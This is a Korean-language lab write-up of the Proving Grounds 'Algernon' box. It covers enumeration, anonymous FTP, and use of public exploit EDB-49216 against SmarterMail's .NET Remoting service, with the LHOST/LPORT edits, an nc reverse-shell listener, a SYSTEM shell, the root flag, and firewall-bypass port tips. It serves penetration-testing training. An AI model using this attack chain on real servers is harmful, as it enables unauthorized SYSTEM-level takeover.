# Algernon

**Platform:** Offensive Security Proving Grounds (PG Practice) **IP:** 192.168.53.65 **Difficulty:** Easy **OS:** Windows **Type:** Boot2Root **Date:** 2026-04-05 **Status:** ✅ Rooted

---

## Tags

`#pgpractice` `#windows` `#smartermail` `#rce` `#dotnet-remoting` `#ftp-anonymous` `#nt-authority-system` `#oscp`

---

## Summary

SmarterMail Build 6985의 .NET Remoting 서비스(포트 17001) RCE 취약점을 이용해 로그인 없이 직접 `nt authority\system` 권한으로 shell 획득. FTP anonymous 접근으로 로그 파일에서 `admin` 유저 확인했으나 실제 exploit에는 불필요.

---

## Enumeration

### Port Scan

```bash
nmap -p- --min-rate 10000 -T4 192.168.53.65
```

```
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
9998/tcp  open  distinct32
17001/tcp open  unknown
```

### Service Scan

```bash
nmap -sC -sV -p 21,80,135,139,445,5040,9998,17001 --min-rate 10000 -T4 192.168.53.65
```

|Port|Service|Version|
|---|---|---|
|21|FTP|Microsoft ftpd — **Anonymous 로그인 가능**|
|80|HTTP|Microsoft IIS 10.0|
|9998|HTTP|**SmarterMail** 웹 관리자 패널|
|17001|Remoting|**MS .NET Remoting services**|

### FTP Anonymous 접근

```bash
ftp 192.168.53.65
# Username: anonymous / Password: (엔터)
```

`Logs` 디렉토리에서 `2020.05.12-administrative.log` 발견:

```
03:35:45 [192.168.118.6] User @ calling create primary system admin, username: admin
03:35:47 [192.168.118.6] Webmail Login successful: With user admin
```

→ `admin` 유저 존재 확인 (실제 exploit에는 불필요)

### Key Findings

- **SmarterMail** (포트 9998) → Build 6985 RCE (CVE-2019-7214)
- **포트 17001** → MS .NET Remoting → exploit 진입점
- SmarterMail이 SYSTEM 권한으로 실행 중 → 초기 접근 = SYSTEM

---

## Exploitation

### Vulnerability

**SmarterMail Build 6985 — Remote Code Execution (EDB-49216)**

- MS .NET Remoting 서비스(포트 17001)를 통한 인증 없는 RCE
- SmarterMail 프로세스가 `nt authority\system`으로 실행됨

### Step 1 — exploit 준비

```bash
searchsploit -m 49216
```

### Step 2 — exploit 수정

```bash
nano 49216.py
```

수정 내용:

```python
HOST = '192.168.53.65'   # 타겟 IP
LHOST = '192.168.49.53'  # Kali IP
LPORT = 80               # 포트 80 사용 (4444는 방화벽 차단)
```

> ⚠️ **Note:** exploit 파일에 보이지 않는 유니코드 공백 문자(U+200B)가 포함되어 있어 SyntaxError 발생 가능. 해당 줄을 backspace로 지우고 다시 입력해야 함.

### Step 3 — 리스너 열기

```bash
nc -lvnp 80
```

> ⚠️ **Note:** 포트 4444, 443 등은 방화벽에 막혀 있음. **포트 80** 또는 **21** 사용.

### Step 4 — exploit 실행

```bash
python3 49216.py
```

### Result

```
connect to [192.168.49.53] from (UNKNOWN) [192.168.53.65] 49817
```

```
C:\Windows\system32> whoami
nt authority\system
```

---

## Post Exploitation

### Root Flag

```bash
type C:\Users\Administrator\Desktop\proof.txt
# 848fc5b13a16da0d4d1057a697cdf8d4
```

---

## Flags

|Flag|Location|Value|
|---|---|---|
|proof.txt|`C:\Users\Administrator\Desktop\proof.txt`|`848fc5b13a16da0d4d1057a697cdf8d4`|

> **Note:** SmarterMail이 SYSTEM으로 실행되어 초기 접근 시 바로 SYSTEM — `local.txt` 없음.

---

## Attack Chain

```
Nmap → FTP anonymous → Logs에서 admin 유저 확인
→ 포트 9998 SmarterMail 발견 → searchsploit EDB-49216
→ 포트 17001 .NET Remoting RCE → nc 포트 80 리스너
→ nt authority\system → proof.txt
```

---

## 헤맸던 이유 & 실패 원인

|시도|결과|실패 원인|
|---|---|---|
|SmarterMail 웹 로그인 시도|❌ 로그인 실패|email 형식 필요 (`user@domain`) — 실제로 로그인 불필요|
|`admin@algernon` 로그인|❌ 실패|도메인 정보 없음|
|`admin@localhost` 로그인|❌ 실패|동일|
|`admin@mail.algernon` 로그인|❌ 실패|동일|
|enum4linux로 도메인 확인|❌ 정보 없음|SMB에서 도메인 정보 미노출|

**핵심 교훈: SmarterMail 로그인 시도 자체가 불필요했음!** 포트 17001 .NET Remoting을 통해 인증 없이 직접 RCE 가능.

---

## Lessons Learned

- **SmarterMail 보이면 바로 searchsploit** — 로그인 시도 전에 exploit 먼저 확인
- **포트 17001 (.NET Remoting)** 이 열려있으면 SmarterMail RCE 가능성 높음
- **방화벽 우회 포트**: 4444 막혀있으면 **80, 21, 443** 순서로 시도
- FTP anonymous 로그 파일은 유저 확인용이지 필수 단계가 아닐 수 있음
- exploit 파일에 **보이지 않는 유니코드 문자** 있을 수 있음 → SyntaxError 시 해당 줄 재입력

---

## References

- [Exploit-DB 49216: SmarterMail Build 6985 RCE](https://www.exploit-db.com/exploits/49216)
- CVE-2019-7214 / CVE-2019-7213
- MS .NET Remoting RCE